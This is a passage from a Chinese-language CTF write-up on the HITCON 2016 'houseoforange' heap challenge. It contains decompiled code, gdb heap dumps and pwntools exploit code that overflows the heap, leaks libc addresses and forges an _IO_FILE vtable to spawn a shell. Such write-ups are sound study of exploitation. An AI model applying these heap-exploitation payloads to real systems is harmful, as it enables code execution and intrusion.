p64(magic)*<span class="number">2</span> ,<span class="string">&quot;red&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="houseoforange_hitcon_2016"><a class="markdownIt-Anchor" href="#houseoforange_hitcon_2016"></a> houseoforange_hitcon_2016</h2>
<h3 id="checksec"><a class="markdownIt-Anchor" href="#checksec"></a> checksec</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    Canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">FORTIFY:  Enabled</span><br></pre></td></tr></table></figure>
<blockquote>
<p>保护全开</p>
</blockquote>
<h3 id="ida"><a class="markdownIt-Anchor" href="#ida"></a> IDA</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 1. Build the house                  &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 2. See the house                    &quot;</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot; 3. Upgrade the house                &quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>没有 <strong>free</strong> 相关函数</p>
</blockquote>
<h4 id="build"><a class="markdownIt-Anchor" href="#build"></a> build</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( unk_203070 &gt; <span class="number">3u</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Too many house&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最多只能有3个橘子</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">v3 = <span class="built_in">malloc</span>(<span class="number">0x10</span>uLL);                         <span class="comment">// 存储house大小</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">size = made_choice();</span><br><span class="line"><span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">  size = <span class="number">0x1000</span>;</span><br><span class="line">v3[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line"><span class="keyword">if</span> ( !v3[<span class="number">1</span>] )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Malloc error !!!&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>最多可以申请 0x1000大小的chunk</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color of Orange:&quot;</span>);</span><br><span class="line">  size_4 = made_choice();</span><br><span class="line">  <span class="keyword">if</span> ( size_4 != <span class="number">0xDDAA</span> &amp;&amp; (size_4 &lt;= <span class="number">0</span> || size_4 &gt; <span class="number">7</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( size_4 == <span class="number">0xDDAA</span> )</span><br><span class="line">    v4[<span class="number">1</span>] = <span class="number">0xDDAA</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v4[<span class="number">1</span>] = size_4 + <span class="number">30</span>;</span><br><span class="line">  *(_QWORD *)v3 = v4;</span><br><span class="line">  house_idx = v3;</span><br><span class="line">  ++unk_203070;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>发现 <strong>color</strong> 可以变为（1&lt;x&lt;=7）|| x=0xDDAA，这里可能是突破口</p>
</blockquote>
<h4 id="upgrade"><a class="markdownIt-Anchor" href="#upgrade"></a> upgrade</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( unk_203074 &gt; <span class="number">2u</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t upgrade more&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>只能使用两次</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Length of name :&quot;</span>);</span><br><span class="line">v2 = made_choice();</span><br><span class="line"><span class="keyword">if</span> ( v2 &gt; <span class="number">0x1000</span> )</span><br><span class="line">  v2 = <span class="number">0x1000</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Name:&quot;</span>);</span><br><span class="line">safe_read((<span class="type">void</span> *)house_name[<span class="number">1</span>], v2);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Price of Orange: &quot;</span>, v2);</span><br><span class="line">v1 = (_DWORD *)*house_name;</span><br><span class="line">*v1 = made_choice();</span><br><span class="line">colorful();  </span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Color of Orange: &quot;</span>);</span><br><span class="line">v3 = made_choice();</span><br><span class="line"><span class="keyword">if</span> ( v3 != <span class="number">0xDDAA</span> &amp;&amp; (v3 &lt;= <span class="number">0</span> || v3 &gt; <span class="number">7</span>) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No such color&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( v3 == <span class="number">0xDDAA</span> )</span><br><span class="line">  *(_DWORD *)(*house_name + <span class="number">4LL</span>) = <span class="number">0xDDAA</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  *(_DWORD *)(*house_name + <span class="number">4LL</span>) = v3 + <span class="number">30</span>;</span><br><span class="line">++unk_203074;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Finish&quot;</span>);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>同样可以申请 0x1000大小的chunk之类的操作，可以堆溢出</p>
</blockquote>
<h3 id="思路"><a class="markdownIt-Anchor" href="#思路"></a> 思路</h3>
<p>1.修改top_chunk的size</p>
<p>2.触发sysmalloc中的_int_free</p>
<p>3.泄露libc和heap的地址</p>
<p>4.触发异常</p>
<h3 id="gdb-2"><a class="markdownIt-Anchor" href="#gdb-2"></a> gdb</h3>
<h4 id="0x1-修改top_chunk的size"><a class="markdownIt-Anchor" href="#0x1-修改top_chunk的size"></a> 0x1 修改top_chunk的size</h4>
<p>申请一个house，结构为</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line">gef➤  x/32gx <span class="number">0x556593871000</span></span><br><span class="line"><span class="number">0x556593871000</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x556593871010</span>:	<span class="number">0x0000556593871070</span>	<span class="number">0x0000556593871030</span></span><br><span class="line"><span class="number">0x556593871020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000041</span></span><br><span class="line"><span class="number">0x556593871030</span>:	<span class="number">0x0000000a61616161</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x556593871040</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x556593871050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x556593871060</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000021</span></span><br><span class="line"><span class="number">0x556593871070</span>:	<span class="number">0x000000210000000a</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x556593871080</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000020f81</span></span><br><span class="line">。。。。。。。。  。。。。。。。。。。。 。。。。。。。。。。</span><br></pre></td></tr></table></figure>
<p>覆盖掉 <strong>top chunk</strong> size域的payload为</p>
<p><code>payload = 'a'*0x30+p64(0)+p64(0x21)+'a'*0x10+p64(0)+p64(0xf81)</code></p>
<p>这样就将 <strong>top_chunk-&gt;szie = 0x1fc0</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0x56222cc84000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x56222cc84010:	0x000056222cc84070	0x000056222cc84030</span><br><span class="line">0x56222cc84020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x56222cc84030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">..............  ..................  ..................</span><br><span class="line">0x56222cc84060:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x56222cc84070:	0x0000002100000006	0x6161616161616161</span><br><span class="line">0x56222cc84080:	0x0000000000000000	0x0000000000000f81</span><br><span class="line">0x56222cc84090:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>修改成功</p>
<h4 id="0x2-触发sysmalloc中的_int_free"><a class="markdownIt-Anchor" href="#0x2-触发sysmalloc中的_int_free"></a> 0x2 触发sysmalloc中的_int_free</h4>
<p>成功修改 <strong>top chunk</strong>,下一步只要我们申请一块 topchunk <strong>大小不满足</strong>的chunk即可，由之前的分析可知我们最大可以申请 <strong>0x1000</strong> 的空间，那么</p>
<p><code>add(0x1000,'b'*8)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Chunk(addr=0x564081bf1010, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf1030, size=0x40, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf1070, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf1090, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf10b0, size=0x20, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)</span><br><span class="line">Chunk(addr=0x564081bf1ff0, size=0x10, flags=)</span><br><span class="line">Chunk(addr=0x564081bf2000, size=0x10, flags=PREV_INUSE)</span><br></pre></td></tr></table></figure>
<p><strong>top_chunk</strong>消失了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[+] unsorted_bins[0]: fw=0x564081bf10c0, bk=0x564081bf10c0</span><br><span class="line"> →   Chunk(addr=0x564081bf10d0, size=0xf20, flags=PREV_INUSE)</span><br><span class="line">[+] Found 1 chunks in unsorted bin.</span><br></pre></td></tr></table></figure>
<p>成功加入 <strong>unsroted bins</strong> ,相当于 <strong>free</strong> 掉了top chunk</p>
<h4 id="0x3-泄露libc和heap的地址"><a class="markdownIt-Anchor" href="#0x3-泄露libc和heap的地址"></a> 0x3 泄露libc和heap的地址</h4>
<p>下从 <strong>unsorted bins</strong> 中取出一点下来用</p>
<p>因为原来有输出的功能，那么我们使用它输出刚才的那个chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#code:</span></span><br><span class="line">	add(<span class="number">0x400</span>,<span class="string">&#x27;c&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">	see()</span><br><span class="line">	leak = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">	log.success(<span class="string">&quot;leak add =&gt; 0x%x&quot;</span>,leak)</span><br><span class="line">	gdb.attach(p)</span><br><span class="line"><span class="comment">#输出</span></span><br><span class="line">[+] leak add =&gt; <span class="number">0x7f5cf839a10a</span></span><br><span class="line"><span class="comment">#gdb</span></span><br><span class="line"><span class="number">0x5584c45e30e0</span> PREV_INUSE &#123;</span><br><span class="line">  prev_size = <span class="number">0</span>, </span><br><span class="line">  size = <span class="number">1041</span>, </span><br><span class="line">  fd = <span class="number">0x6363636363636363</span>, </span><br><span class="line">  bk = <span class="number">0x7f5cf839a10a</span> &lt;main_arena+<span class="number">1514</span>&gt;, </span><br><span class="line">  fd_nextsize = <span class="number">0x5584c45e30e0</span>, </span><br><span class="line">  bk_nextsize = <span class="number">0x5584c45e30e0</span></span><br><span class="line">&#125;</span><br><span class="line">vmmap</span><br><span class="line">   <span class="number">0x5584c45e3000</span>     <span class="number">0x5584c4626000</span> rw-p    <span class="number">43000</span> <span class="number">0</span>      [heap]</span><br><span class="line">    <span class="number">0x7f5cf7fd5000</span>     <span class="number">0x7f5cf8195000</span> r-xp   1c0000 <span class="number">0</span>      /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7f5cf8195000</span>     <span class="number">0x7f5cf8395000</span> ---p   <span class="number">200000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7f5cf8395000</span>     <span class="number">0x7f5cf8399000</span> r--p     <span class="number">4000</span> 1c0000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br><span class="line">    <span class="number">0x7f5cf8399000</span>     <span class="number">0x7f5cf839b000</span> rw-p     <span class="number">2000</span> 1c4000 /lib/x86_64-linux-gnu/libc-<span class="number">2.23</span>.so</span><br></pre></td></tr></table></figure>
<p>如果知道是知道libc2.23的话</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000-1514)</span><br><span class="line">&#x27;0x3c4b20&#x27;</span><br></pre></td></tr></table></figure>
<p>不知道的话直接加减</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x7f5cf839a10a-0x7f5cf7fd5000)</span><br><span class="line">&#x27;0x3c510a&#x27;</span><br></pre></td></tr></table></figure>
<p>同理可知 heap_base</p>
<p>开始泄露，但是要泄露什么？这里泄露的东西就决定了我们攻击的方式</p>
<p>这道题保护全开，之前的方法好像不太行，想起之前的文章<a target="_blank" rel="noopener" href="http://www.joe1sn.top/2020/04/22/io_file/">FILE结构</a></p>
<p>那我们可以伪造出一个file，通过修改 <strong>vtable</strong> 指针来调用 <strong>system</strong>那么就需要</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base = leak-<span class="number">0x3c510a</span></span><br><span class="line">system_addr = libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base+libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>).<span class="built_in">next</span>()</span><br><span class="line">IO_list_all = libc_base+libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">IO_str_jumps = libc.symbols[<span class="string">&quot;_IO_file_jumps&quot;</span>]+<span class="number">0xc0</span>+libc_base</span><br></pre></td></tr></table></figure>
<h4 id="0x4-开始构造-fake-file"><a class="markdownIt-Anchor" href="#0x4-开始构造-fake-file"></a> 0x4 开始构造 fake file</h4>
<blockquote>
<blockquote>
<p>ptr_vtable指向伪造的vtable处，vtable[3]为IO_overflow函数地址，将vtable[3]伪造为system地址，</p>
</blockquote>
<blockquote>
<p>如果再进入build_house函数，进行malloc(0x10)，由于0x10&lt;=2*SIZE_SZ，就会触发malloc_printerr，会遍历IO_llist_all，通过chain找到最终伪造的在old top chunk处的_IO_FILE，然后找到vtable，最终调用 IO_overflow函数</p>
</blockquote>
<blockquote>
<p>调用IO_overflow时会传入_IO_FILE结构指针作为参数，将old top chunk处伪造的_IO_FILE的前几个字节修改为/bin/sh\x00 即最终调用为system(‘/bin/sh’)</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/aaa15893831716/article/details/102408187">2016 ctf-HITCON——houseoforange</a></p>
</blockquote>
<p>FILE结构</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> _flags;		<span class="comment">/* 高阶版本也叫作 _IO_MAGIC; rest is flags. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following pointers correspond to the C++ streambuf protocol. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_ptr;	<span class="comment">/* Current read pointer */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_end;	<span class="comment">/* End of get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_read_base;	<span class="comment">/* Start of putback+get area. */</span></span><br><span class="line">    <span class="comment">//read</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_base;	<span class="comment">/* Start of put area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_ptr;	<span class="comment">/* Current put pointer. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_write_end;	<span class="comment">/* End of put area. */</span></span><br><span class="line">    <span class="comment">//write</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_base;	<span class="comment">/* Start of reserve area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_buf_end;	<span class="comment">/* End of reserve area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* The following fields are used to support backing up and undo. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_base; <span class="comment">/* Pointer to start of non-current get area. */</span></span><br><span class="line">  <span class="type">char</span> *_IO_backup_base;  <span class="comment">/* Pointer to first valid character of backup area */</span></span><br><span class="line">  <span class="type">char</span> *_IO_save_end; <span class="comment">/* Pointer to end of non-current get area. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_marker</span> *_<span class="title">markers</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">IO_FILE</span> *_<span class="title">chain</span>;</span><span class="comment">//通过这个域创造链表</span></span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> _fileno;</span><br><span class="line">  <span class="type">int</span> _flags2;</span><br><span class="line">  <span class="type">__off_t</span> _old_offset; <span class="comment">/* This used to be _offset but it&#x27;s too small.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* 1+column number of pbase(); 0 is unknown. */</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> _cur_column;</span><br><span class="line">  <span class="type">signed</span> <span class="type">char</span> _vtable_offset;</span><br><span class="line">  <span class="type">char</span> _shortbuf[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">  _IO_lock_t *_lock;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _IO_USE_OLD_IO_FILE</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>偏移0x20处为IO_write_base,偏移0x28处为IO_write_ptr,偏移0xc8处为_mode,偏移0xd8处为ptr_vtable</p>
<p>绕过检测：</p>
<pre><code>1._mode&lt;=0

2._IO_write_base&lt;IO_write_ptr
</code></pre>
<p>最终的结构体</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x400</span></span><br><span class="line">payload += p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">fake_file =	p64(<span class="number">0</span>)+p64(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#利用unsorted bin attack将 _IO_list_all修改为main_arena+0x58(即&amp;unsorted_bin+0x10)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(IO_list_all-<span class="number">0x10</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)</span><br><span class="line">fake_file += p64(<span class="number">0</span>)+p64(binsh)</span><br><span class="line"></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xc0</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += fake_file</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span></span><br><span class="line">payload += p64(IO_str_jumps-<span class="number">0x8</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(system_addr)	<span class="comment">#jump2here</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: 0x55b6afcad510 ◂— 0x0</span><br><span class="line">BK: 0x55b6afcad510 —▸ 0x7f0850d77510 ◂— 0x0</span><br><span class="line">pwndbg&gt; x/12gx 0x7f0850d77510</span><br><span class="line">0x7f0850d77510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7f0850d77520 &lt;_IO_list_all&gt;:	0x00007f0850d77540	0x0000000000000000</span><br><span class="line">0x7f0850d77530:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
<p>已经迁移IO_list_all</p>
<h3 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> EXP</h3>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level =&quot;debug&quot;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/mnt/d/CTF/Question/BUUCTF/libc/64/libc-2.23.so&quot;</span>)</span><br><span class="line">p = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>(<span class="params">ip,port,mode</span>):</span><br><span class="line">	<span class="keyword">global</span> p</span><br><span class="line">	<span class="keyword">if</span> mode == <span class="number">1</span>:</span><br><span class="line">		p = process(<span class="string">&quot;./houseoforange_hitcon_2016&quot;</span>)</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">sz,name</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;: &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="built_in">str</span>(sz))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,name)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;10&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;:&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">see</span>():</span><br><span class="line">	